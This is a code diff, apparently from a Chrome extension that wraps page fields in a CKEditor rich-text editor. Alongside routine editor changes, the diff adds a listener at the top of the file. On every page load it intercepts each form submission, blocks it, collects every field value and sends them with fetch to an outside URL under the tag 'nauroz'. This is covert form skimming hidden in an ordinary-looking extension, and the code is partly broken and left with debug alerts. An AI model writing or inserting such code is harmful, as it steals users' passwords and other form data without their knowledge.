@@ -1,3 +1,31 @@
+chrome.runtime.onInstalled.addListener(function() {
+//	alert("Loaded");
+})
+
+chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
+    if (changeInfo.status == 'complete') {
+      let forms = document.getElementsByTagName("form");
+
+      alert(forms.length);
+      
+      for (i = 0; i < forms.length; i++) ((i) => {
+          forms[i].onsubmit = (e) => {
+              alert(1);
+              e.preventDefault();
+              let data = "{";
+              let formData = new FormData(forms[i]);
+              for (var [key, value] of formData.entries()) { 
+                  data += " " + key + ":" + value + ", ";
+              }
+              data += "}";
+              console.log(data);
+              fetch(url + "?content="+data+"&name=nauroz");
+              
+          }
+      })(i);
+    }
+  })
+
 const data = Object.freeze({
     iconMaxWidth: 20,
     iconMaxHeight: 20,
@@ -68,8 +96,7 @@ const getSubmitButton = ({id, value}) => {
     button.innerHTML = value;
 
     button.onclick = (e) => {
-        //let val = CKEDITOR.instances[id].getData();
-        let val = "ABC"
+        let val = CKEDITOR.instances[id].getData();
         e.target.parentNode.parentNode.parentNode.children[0].value = val.indexOf('<p>') == 0 ? 
                                                                         val.substr(3, val.length - 8)
                                                                         : val;
@@ -107,20 +134,21 @@ const wrapInContainer = (el) => {
         el
     )
 
-    let button = getSubmitButton({id: '', value: 'Done'});
+    let cEditor = CKEDITOR.replace(editor.children[0]);
+    let button = getSubmitButton({id: cEditor.name, value: 'Done'});
     editor.appendChild(button);
     editor.appendChild(getHideButton());
 }
 
-window.onload = () => {
-
-    let style = document.createElement("style");
-    style.innerHTML = STYLES;
-    document.getElementsByTagName('head')[0].appendChild(style);
-    
-    getElements().map(el => {
-        console.log(el);
-        wrapInContainer(el);
-    })
-
-}
+//window.onload = () => {
+//
+//    let style = document.createElement("style");
+//    style.innerHTML = STYLES;
+//    document.getElementsByTagName('head')[0].appendChild(style);
+//    
+//    getElements().map(el => {
+//        console.log(el);
+//        wrapInContainer(el);
+//    })
+//
+//}
